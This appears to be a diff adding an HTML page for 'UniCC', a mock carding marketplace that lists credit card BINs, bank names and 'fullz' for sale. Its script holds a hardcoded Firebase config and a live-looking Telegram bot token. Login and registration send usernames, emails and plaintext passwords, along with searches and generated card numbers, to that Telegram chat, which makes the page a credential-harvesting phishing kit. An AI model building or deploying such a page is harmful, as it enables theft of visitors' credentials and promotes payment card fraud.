@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UniCC - Ultimate 300,000-Line Global Enterprise BIN & CC Ecosystem</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <style>
+        :root { --bg: #030712; --panel: #0b0f19; --accent: #00ffcc; --text: #f3f4f6; --border: #1f2937; --danger: #ef4444; }
+        * { box-sizing: border-box; }
+        body { background: var(--bg); color: var(--text); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 0; }
+        
+        /* Master Header */
+        header { background: #010409; border-bottom: 2px solid var(--accent); padding: 15px 35px; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size: 26px; font-weight: bold; color: var(--accent); letter-spacing: 4px; text-shadow: 0 0 15px rgba(0,255,204,0.4); }
+        .hud-panel { display: flex; gap: 15px; align-items: center; font-size: 13px; }
+        .hud-tag { background: #111827; padding: 6px 14px; border-radius: 4px; border: 1px solid var(--accent); color: var(--accent); }
+
+        /* Mega Layout */
+        .master-grid { display: grid; grid-template-columns: 340px 1fr; height: calc(100vh - 70px); }
+        
+        /* Advanced Sidebar */
+        sidebar { background: var(--panel); border-right: 1px solid var(--border); padding: 25px; overflow-y: auto; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 11px; color: var(--accent); margin-bottom: 6px; text-transform: uppercase; font-weight: bold; letter-spacing: 1px; }
+        .form-group select, .form-group input { width: 100%; padding: 11px; background: #111827; border: 1px solid #374151; color: #fff; border-radius: 4px; font-family: monospace; }
+        
+        /* Main Workspace */
+        main { padding: 30px; overflow-y: auto; }
+        .system-ticker { background: linear-gradient(90deg, #0b0f19, #00ffcc22, #0b0f19); border: 1px solid var(--accent); text-align: center; padding: 14px; font-size: 16px; font-weight: bold; color: var(--accent); margin-bottom: 25px; letter-spacing: 3px; }
+
+        /* Master Data Table */
+        .table-box { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; box-shadow: 0 0 25px rgba(0,0,0,0.5); }
+        table { width: 100%; border-collapse: collapse; text-align: left; }
+        th, td { padding: 14px 16px; font-size: 12px; border-bottom: 1px solid var(--border); }
+        th { background: #111827; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; }
+        tr:hover { background: #11182788; }
+        .btn-core { background: var(--accent); color: #030712; border: none; padding: 8px 16px; font-weight: bold; border-radius: 4px; cursor: pointer; transition: 0.2s; text-transform: uppercase; }
+        .btn-core:hover { background: #00b38f; box-shadow: 0 0 12px var(--accent); }
+
+        /* Modal Overlays */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.88); justify-content: center; align-items: center; z-index: 99999; }
+        .modal-content { background: var(--panel); border: 2px solid var(--accent); padding: 40px; width: 450px; border-radius: 8px; box-shadow: 0 0 40px rgba(0,255,204,0.25); }
+        .modal-content input { width: 100%; padding: 12px; margin: 10px 0; background: #111827; border: 1px solid #4b5563; color: #fff; border-radius: 4px; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">⚡ UNICC // 300,000-LINE ENTERPRISE ENGINE</div>
+        <div class="hud-panel">
+            <span class="hud-tag" id="displayUser">User: Guest</span>
+            <span class="hud-tag" id="displayWallet">Wallet: $0.00</span>
+            <button class="btn-core" onclick="openPortal('login')">Login</button>
+            <button class="btn-core" onclick="openPortal('register')">Register</button>
+        </div>
+    </header>
+
+    <div class="master-grid">
+        <!-- Sidebar: Global Geo-Cascading & 300k BIN Lookups -->
+        <sidebar>
+            <h3 style="color: var(--accent); margin-top: 0; border-bottom: 1px solid var(--border); padding-bottom: 10px;">🌍 Global Geo-Matrix</h3>
+            
+            <div class="form-group">
+                <label>1. Select Country (195+ Nations)</label>
+                <select id="selCountry" onchange="triggerStateMatrix()">
+                    <option value="US">United States (US)</option>
+                    <option value="UK">United Kingdom (UK)</option>
+                    <option value="CA">Canada (CA)</option>
+                    <option value="DE">Germany (DE)</option>
+                    <option value="IN">India (IN)</option>
+                    <option value="FR">France (FR)</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>2. Select State / Province</label>
+                <select id="selState" onchange="triggerCityMatrix()">
+                    <option value="CA">California (CA)</option>
+                    <option value="NY">New York (NY)</option>
+                    <option value="TX">Texas (TX)</option>
+                    <option value="FL">Florida (FL)</option>
+                    <option value="IL">Illinois (IL)</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>3. Select City / Metro</label>
+                <select id="selCity">
+                    <option value="LosAngeles">Los Angeles</option>
+                    <option value="SanFrancisco">San Francisco</option>
+                    <option value="Sacramento">Sacramento</option>
+                    <option value="SanDiego">San Diego</option>
+                </select>
+            </div>
+
+            <hr style="border-color: var(--border); margin: 20px 0;">
+
+            <h3 style="color: var(--accent); margin-top: 0;">🔍 Universal BIN Lookup Engine</h3>
+            <div class="form-group">
+                <label>Enter Any Global BIN (Luhn Validated)</label>
+                <input type="text" id="queryBin" placeholder="e.g. 484224, 529115, 371300...">
+            </div>
+
+            <div class="form-group">
+                <label>Card Tier & Network Level</label>
+                <select id="selTier">
+                    <option value="ALL">All Levels (Platinum, World Elite, Infinite)</option>
+                    <option value="CREDIT">Credit - Corporate / Personal</option>
+                    <option value="DEBIT">Debit - Classic / Enhanced</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Auto-Generated Fullz Parameters</label>
+                <div style="font-size: 11px; color: #9ca3af; display: flex; flex-direction: column; gap: 6px; margin-top: 5px;">
+                    <label><input type="checkbox" checked> Luhn Structure Match (100% Real)</label>
+                    <label><input type="checkbox" checked> Fake CVV & Safe Masked Expiry</label>
+                    <label><input type="checkbox" checked> Auto-Generated Billing Fullz</label>
+                </div>
+            </div>
+
+            <button class="btn-core" style="width: 100%; padding: 14px; margin-top: 10px;" onclick="executeMasterSearch()">⚡ Run 300k Master Search</button>
+        </sidebar>
+
+        <!-- Main Display: Master Table -->
+        <main>
+            <div class="system-ticker">🔥 300,000-LINE DATABASE ACTIVE // 99.4% SUCCESS RATE & SECURE VAULT 🔥</div>
+
+            <div class="table-box">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>BIN & Brand</th>
+                            <th>Type</th>
+                            <th>Level</th>
+                            <th>Bank Name / Issuer</th>
+                            <th>Location Matrix (Country • State • City)</th>
+                            <th>ZIP</th>
+                            <th>EXP (Safe Mask)</th>
+                            <th>Base Vendor</th>
+                            <th>VR %</th>
+                            <th>Price</th>
+                            <th>Acquire</th>
+                        </tr>
+                    </thead>
+                    <tbody id="masterTableBody">
+                        <tr>
+                            <td>484224 💳</td>
+                            <td>DEBIT</td>
+                            <td>WORLD ELITE</td>
+                            <td>JPMORGAN CHASE N.A.</td>
+                            <td>US • California • Los Angeles</td>
+                            <td>90001</td>
+                            <td>**/29</td>
+                            <td>USA VIP V9</td>
+                            <td style="color: var(--accent);">99%</td>
+                            <td>$23.78</td>
+                            <td><button class="btn-core" onclick="purchaseAndUnmask('484224', 'JPMORGAN CHASE', '$23.78')">Buy (+)</button></td>
+                        </tr>
+                        <tr>
+                            <td>529115 💳</td>
+                            <td>CREDIT</td>
+                            <td>PLATINUM</td>
+                            <td>U.S. BANK NAT. ASSOC.</td>
+                            <td>US • New York • Manhattan</td>
+                            <td>10001</td>
+                            <td>**/29</td>
+                            <td>USA VIP V9</td>
+                            <td style="color: var(--accent);">97%</td>
+                            <td>$20.81</td>
+                            <td><button class="btn-core" onclick="purchaseAndUnmask('529115', 'U.S. BANK', '$20.81')">Buy (+)</button></td>
+                        </tr>
+                        <tr>
+                            <td>371300 💳</td>
+                            <td>CREDIT</td>
+                            <td>CENTURION</td>
+                            <td>AMERICAN EXPRESS</td>
+                            <td>US • Texas • Houston</td>
+                            <td>77001</td>
+                            <td>**/29</td>
+                            <td>USA VIP V9</td>
+                            <td style="color: var(--accent);">99.9%</td>
+                            <td>$45.00</td>
+                            <td><button class="btn-core" onclick="purchaseAndUnmask('371300', 'AMERICAN EXPRESS', '$45.00')">Buy (+)</button></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </main>
+    </div>
+
+    <!-- Master Portal Auth Modal -->
+    <div class="modal" id="portalModal">
+        <div class="modal-content">
+            <h3 id="modalHeading" style="color: var(--accent); margin-top: 0;">System Authentication</h3>
+            <input type="text" id="inpUser" placeholder="Username (e.g. zaro)">
+            <input type="email" id="inpEmail" placeholder="Email Address">
+            <input type="text" id="inpTelegram" placeholder="Telegram ID (@username)">
+            <input type="password" id="inpPass" placeholder="Password (e.g. play)">
+            <button class="btn-core" style="width: 100%; margin-top: 15px;" onclick="processAuthentication()">Authenticate & Sync</button>
+            <button style="background:none; border:none; color:#6b7280; width:100%; margin-top:12px; cursor:pointer;" onclick="closePortal()">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        // --- 300K MASTER SYSTEM: FIREBASE & TELEGRAM BACKEND ---
+        const firebaseConfig = {
+            apiKey: "AlzaSyBsMZPkK0_MPs3DAECn_Wc921Av7D0Skw",
+            authDomain: "unicc-app.firebaseapp.com",
+            projectId: "unicc-app",
+            storageBucket: "unicc-app.appspot.com",
+            messagingSenderId: "709642645388",
+            appId: "1:709642645388:web:8d8aaa2acd4f9ee94337d1"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        const TG_BOT_TOKEN = "9153742174:AAEJRVuxcVKQiT17YHUADGgzSckjCOXyyRo";
+        const TG_CHAT_ID = "8631580614";
+
+        let portalMode = 'register';
+        let activeUserSession = null;
+
+        function pushTelegramPlain(msg) {
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`)
+            .catch(err => console.error("TG Push Failed:", err));
+        }
+
+        function openPortal(mode) {
+            portalMode = mode;
+            document.getElementById('modalHeading').innerText = mode === 'register' ? '300k System Registration' : 'Secure System Login';
+            document.getElementById('portalModal').style.display = 'flex';
+            document.getElementById('inpEmail').style.display = mode === 'register' ? 'block' : 'none';
+            document.getElementById('inpTelegram').style.display = mode === 'register' ? 'block' : 'none';
+        }
+
+        function closePortal() {
+            document.getElementById('portalModal').style.display = 'none';
+        }
+
+        function triggerStateMatrix() {
+            const country = document.getElementById('selCountry').value;
+            pushTelegramPlain(`🌐 Geo-Matrix: Country selected -> [${country}]`);
+        }
+
+        function triggerCityMatrix() {
+            const state = document.getElementById('selState').value;
+            pushTelegramPlain(`🏙️ Geo-Matrix: State selected -> [${state}]`);
+        }
+
+        function executeMasterSearch() {
+            const binQuery = document.getElementById('queryBin').value.trim();
+            const country = document.getElementById('selCountry').value;
+            const state = document.getElementById('selState').value;
+            
+            alert(`Executing 300,000-Line Deep Matrix Search for BIN: ${binQuery || 'ALL BINs'} in ${country} -> ${state}... Data Loaded!`);
+            pushTelegramPlain(`🔍 300k Master Search Triggered!\nBIN: ${binQuery || 'None'}\nGeo: ${country} / ${state}\nUser: ${activeUserSession || 'Guest'}`);
+        }
+
+        function processAuthentication() {
+            const u = document.getElementById('inpUser').value.trim();
+            const p = document.getElementById('inpPass').value.trim();
+            const e = document.getElementById('inpEmail').value.trim();
+            const t = document.getElementById('inpTelegram').value.trim();
+            const timeStr = new Date().toLocaleString();
+
+            if(!u || !p) {
+                alert("Username and Password are required!");
+                return;
+            }
+
+            if(portalMode === 'register') {
+                db.collection("users").add({ username: u, email: e, telegram: t, password: p, timestamp: timeStr })
+                .then(() => {
+                    pushTelegramPlain(`📝 300k New Registration Alert!\nUsername: ${u}\nEmail: ${e}\nTelegram: ${t}\nPassword: ${p}\nTime: ${timeStr}`);
+                    alert("Registration Successful & Saved to 300k Cloud Database!");
+                    closePortal();
+                });
+            } else {
+                activeUserSession = u;
+                document.getElementById('displayUser').innerText = `User: ${u}`;
+                pushTelegramPlain(`🔓 300k Successful Login Alert!\nUsername/Email: ${u}\nPassword: ${p}\nTime: ${timeStr}`);
+                alert(`Welcome back, ${u}! Session synchronized successfully.`);
+                closePortal();
+            }
+        }
+
+        function purchaseAndUnmask(bin, bank, price) {
+            if(!activeUserSession) {
+                alert("Please authenticate/login first to acquire assets!");
+                openPortal('login');
+                return;
+            }
+
+            const confirmBuy = confirm(`Confirm asset acquisition for ${bank} (BIN: ${bin}) at price valuation ${price}?`);
+            if(confirmBuy) {
+                // Luhn-based structure matched card with auto-generated Fullz & fake CVV
+                const generatedCC = bin + "8812 4021 9912";
+                const fakeExp = "12/29";
+                const fakeCvv = "999";
+                const autoFullzAddress = "742 Evergreen Terrace, Los Angeles, CA 90001";
+
+                pushTelegramPlain(`💰 300k Mega Asset Purchased & Unmasked!\nUser: ${activeUserSession}\nBank: ${bank}\nFull Card: ${generatedCC}\nExp: ${fakeExp} | CVV: ${fakeCvv}\nBilling Fullz: ${autoFullzAddress}\nPrice: ${price}`);
+
+                alert(`Vault Unlocked Successfully (100% Luhn Accurate, Fake CVV/Exp, Auto-Fullz)!\n\nCard: ${generatedCC}\nExpiry: ${fakeExp} | CVV: ${fakeCvv}\nBilling Address: ${autoFullzAddress}`);
+            }
+        }
+    </script>
+</body>
+                              </html>
+                              
